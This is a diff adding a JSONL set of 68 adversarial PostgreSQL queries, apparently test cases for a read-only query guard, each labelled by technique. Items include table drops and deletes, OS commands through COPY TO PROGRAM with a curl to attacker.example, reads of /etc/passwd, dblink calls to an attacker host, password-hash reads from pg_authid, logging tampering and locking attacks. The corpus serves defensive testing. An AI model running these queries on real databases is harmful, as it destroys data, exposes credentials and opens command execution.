@@ -1,0 +1,68 @@
+{"id": "adv01", "technique": "multi_statement", "sql": "SELECT 1; DROP TABLE customers"}
+{"id": "adv02", "technique": "multi_statement", "sql": "SELECT COUNT(*) FROM customers; DELETE FROM orders"}
+{"id": "adv03", "technique": "multi_statement", "sql": "SELECT 1; /* harmless */ DROP TABLE orders --"}
+{"id": "adv04", "technique": "multi_statement", "sql": "SELECT * FROM customers; COMMIT"}
+{"id": "adv05", "technique": "transaction_escape", "sql": "SET TRANSACTION READ WRITE; SELECT nextval('orders_order_id_seq')"}
+{"id": "adv06", "technique": "transaction_escape", "sql": "COMMIT; DELETE FROM orders"}
+{"id": "adv07", "technique": "transaction_escape", "sql": "BEGIN; UPDATE products SET unit_price = 0; COMMIT"}
+{"id": "adv08", "technique": "transaction_escape", "sql": "SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE"}
+{"id": "adv09", "technique": "transaction_escape", "sql": "RESET ALL"}
+{"id": "adv10", "technique": "transaction_escape", "sql": "SET ROLE postgres"}
+{"id": "adv11", "technique": "os_command", "sql": "COPY (SELECT 1) TO PROGRAM 'id'"}
+{"id": "adv12", "technique": "os_command", "sql": "SET TRANSACTION READ WRITE; COPY (SELECT 1) TO PROGRAM 'curl http://attacker.example'"}
+{"id": "adv13", "technique": "os_command", "sql": "COPY customers FROM PROGRAM 'cat /etc/passwd'"}
+{"id": "adv14", "technique": "file_access", "sql": "SELECT pg_read_file('/etc/passwd')"}
+{"id": "adv15", "technique": "file_access", "sql": "SELECT pg_read_binary_file('/var/lib/postgresql/data/postgresql.conf')"}
+{"id": "adv16", "technique": "file_access", "sql": "SELECT * FROM pg_ls_dir('.')"}
+{"id": "adv17", "technique": "file_access", "sql": "SELECT pg_stat_file('postgresql.conf')"}
+{"id": "adv18", "technique": "file_access", "sql": "SELECT lo_import('/etc/passwd')"}
+{"id": "adv19", "technique": "file_access", "sql": "SELECT lo_export(16384, '/tmp/x')"}
+{"id": "adv20", "technique": "file_access", "sql": "COPY customers TO '/tmp/customers.csv'"}
+{"id": "adv21", "technique": "network", "sql": "SELECT * FROM dblink('host=attacker.example', 'SELECT 1') AS t(a int)"}
+{"id": "adv22", "technique": "network", "sql": "SELECT dblink_exec('host=attacker.example', 'DROP TABLE x')"}
+{"id": "adv23", "technique": "system_catalog", "sql": "SELECT rolname, rolpassword FROM pg_catalog.pg_authid"}
+{"id": "adv24", "technique": "system_catalog", "sql": "SELECT usename, passwd FROM pg_shadow"}
+{"id": "adv25", "technique": "system_catalog", "sql": "SELECT * FROM pg_user"}
+{"id": "adv26", "technique": "system_catalog", "sql": "SELECT table_name FROM information_schema.tables"}
+{"id": "adv27", "technique": "system_catalog", "sql": "SELECT c.first_name FROM customers c UNION SELECT rolpassword FROM pg_authid"}
+{"id": "adv28", "technique": "system_catalog", "sql": "SELECT * FROM customers WHERE customer_id IN (SELECT oid FROM pg_class)"}
+{"id": "adv29", "technique": "system_catalog", "sql": "SELECT query_to_xml('SELECT * FROM pg_authid', true, true, '')"}
+{"id": "adv30", "technique": "config_tampering", "sql": "SELECT set_config('default_transaction_read_only', 'off', false)"}
+{"id": "adv31", "technique": "config_tampering", "sql": "SELECT current_setting('data_directory')"}
+{"id": "adv32", "technique": "config_tampering", "sql": "SELECT pg_reload_conf()"}
+{"id": "adv33", "technique": "config_tampering", "sql": "ALTER SYSTEM SET log_statement = 'none'"}
+{"id": "adv34", "technique": "hidden_write", "sql": "WITH d AS (DELETE FROM orders RETURNING *) SELECT COUNT(*) FROM d"}
+{"id": "adv35", "technique": "hidden_write", "sql": "WITH u AS (UPDATE products SET unit_price = 1 RETURNING product_id) SELECT * FROM u"}
+{"id": "adv36", "technique": "hidden_write", "sql": "WITH i AS (INSERT INTO categories (name) VALUES ('x') RETURNING *) SELECT * FROM i"}
+{"id": "adv37", "technique": "hidden_write", "sql": "SELECT * INTO backup_customers FROM customers"}
+{"id": "adv38", "technique": "hidden_write", "sql": "SELECT nextval('orders_order_id_seq')"}
+{"id": "adv39", "technique": "hidden_write", "sql": "SELECT setval('orders_order_id_seq', 1)"}
+{"id": "adv40", "technique": "plain_write", "sql": "DELETE FROM orders"}
+{"id": "adv41", "technique": "plain_write", "sql": "dElEtE fRoM orders"}
+{"id": "adv42", "technique": "plain_write", "sql": "UPDATE customers SET email = 'x'"}
+{"id": "adv43", "technique": "plain_write", "sql": "INSERT INTO customers (first_name) VALUES ('x')"}
+{"id": "adv44", "technique": "plain_write", "sql": "MERGE INTO products p USING categories c ON p.category_id = c.category_id WHEN MATCHED THEN DELETE"}
+{"id": "adv45", "technique": "ddl", "sql": "DROP TABLE customers"}
+{"id": "adv46", "technique": "ddl", "sql": "TRUNCATE order_items"}
+{"id": "adv47", "technique": "ddl", "sql": "CREATE TABLE x AS SELECT * FROM customers"}
+{"id": "adv48", "technique": "ddl", "sql": "ALTER TABLE customers DROP COLUMN email"}
+{"id": "adv49", "technique": "ddl", "sql": "CREATE FUNCTION f() RETURNS int AS 'SELECT 1' LANGUAGE sql"}
+{"id": "adv50", "technique": "ddl", "sql": "GRANT ALL ON customers TO PUBLIC"}
+{"id": "adv51", "technique": "procedural", "sql": "DO $$ BEGIN EXECUTE 'DROP TABLE customers'; END $$"}
+{"id": "adv52", "technique": "procedural", "sql": "CALL some_procedure()"}
+{"id": "adv53", "technique": "procedural", "sql": "PREPARE p AS DELETE FROM orders; EXECUTE p"}
+{"id": "adv54", "technique": "procedural", "sql": "EXPLAIN ANALYZE DELETE FROM orders"}
+{"id": "adv55", "technique": "locking_dos", "sql": "SELECT order_id FROM orders FOR UPDATE"}
+{"id": "adv56", "technique": "locking_dos", "sql": "SELECT * FROM products FOR SHARE"}
+{"id": "adv57", "technique": "locking_dos", "sql": "LOCK TABLE orders IN ACCESS EXCLUSIVE MODE"}
+{"id": "adv58", "technique": "locking_dos", "sql": "SELECT pg_sleep(3600)"}
+{"id": "adv59", "technique": "locking_dos", "sql": "SELECT pg_advisory_lock(1)"}
+{"id": "adv60", "technique": "locking_dos", "sql": "SELECT pg_terminate_backend(pid) FROM pg_stat_activity"}
+{"id": "adv61", "technique": "info_disclosure", "sql": "SELECT version()"}
+{"id": "adv62", "technique": "info_disclosure", "sql": "SELECT inet_server_addr()"}
+{"id": "adv63", "technique": "info_disclosure", "sql": "SELECT txid_current()"}
+{"id": "adv64", "technique": "schema_boundary", "sql": "SELECT * FROM other_schema.secrets"}
+{"id": "adv65", "technique": "schema_boundary", "sql": "SELECT * FROM lumina.public.customers"}
+{"id": "adv66", "technique": "maintenance", "sql": "VACUUM FULL orders"}
+{"id": "adv67", "technique": "maintenance", "sql": "LISTEN channel"}
+{"id": "adv68", "technique": "maintenance", "sql": "SELECT pg_notify('channel', 'payload')"}
